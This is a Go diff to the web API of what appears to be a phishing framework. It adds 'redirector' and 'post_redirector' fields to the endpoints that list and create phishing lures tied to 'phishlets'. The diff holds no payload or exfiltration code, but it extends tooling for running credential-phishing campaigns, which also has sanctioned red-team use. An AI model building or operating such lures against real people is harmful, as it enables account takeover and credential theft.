@@ -412,13 +412,15 @@ func (w *WebAPI) handleConfigFull(rw http.ResponseWriter, req *http.Request) {
 		l, err := w.cfg.GetLure(i)
 		if err == nil {
 			lures = append(lures, map[string]interface{}{
-				"index":    i,
-				"id":       l.Id,
-				"phishlet": l.Phishlet,
-				"hostname": l.Hostname,
-				"path":     l.Path,
-				"redirect": l.RedirectUrl,
-				"info":     l.Info,
+				"index":           i,
+				"id":              l.Id,
+				"phishlet":        l.Phishlet,
+				"hostname":        l.Hostname,
+				"path":            l.Path,
+				"redirect":        l.RedirectUrl,
+				"redirector":      l.Redirector,
+				"post_redirector": l.PostRedirector,
+				"info":            l.Info,
 			})
 		}
 	}
@@ -702,6 +704,7 @@ func (w *WebAPI) handleLures(rw http.ResponseWriter, req *http.Request) {
 				"path":             l.Path,
 				"redirect_url":     l.RedirectUrl,
 				"redirector":       l.Redirector,
+				"post_redirector":  l.PostRedirector,
 				"ua_filter":        l.UserAgentFilter,
 				"info":             l.Info,
 				"og_title":         l.OgTitle,
@@ -724,10 +727,12 @@ func (w *WebAPI) handleLureCreate(rw http.ResponseWriter, req *http.Request) {
 	}
 
 	var payload struct {
-		Phishlet    string `json:"phishlet"`
-		Path        string `json:"path"`
-		RedirectUrl string `json:"redirect_url"`
-		Info        string `json:"info"`
+		Phishlet       string `json:"phishlet"`
+		Path           string `json:"path"`
+		RedirectUrl    string `json:"redirect_url"`
+		Redirector     string `json:"redirector"`
+		PostRedirector string `json:"post_redirector"`
+		Info           string `json:"info"`
 	}
 	if err := json.NewDecoder(req.Body).Decode(&payload); err != nil {
 		rw.Header().Set("Content-Type", "application/json")
@@ -752,10 +757,12 @@ func (w *WebAPI) handleLureCreate(rw http.ResponseWriter, req *http.Request) {
 	}
 
 	l := &Lure{
-		Phishlet:    payload.Phishlet,
-		Path:        payload.Path,
-		RedirectUrl: payload.RedirectUrl,
-		Info:        payload.Info,
+		Phishlet:       payload.Phishlet,
+		Path:           payload.Path,
+		RedirectUrl:    payload.RedirectUrl,
+		Redirector:     payload.Redirector,
+		PostRedirector: payload.PostRedirector,
+		Info:           payload.Info,
 	}
 	w.cfg.AddLure(payload.Phishlet, l)
 
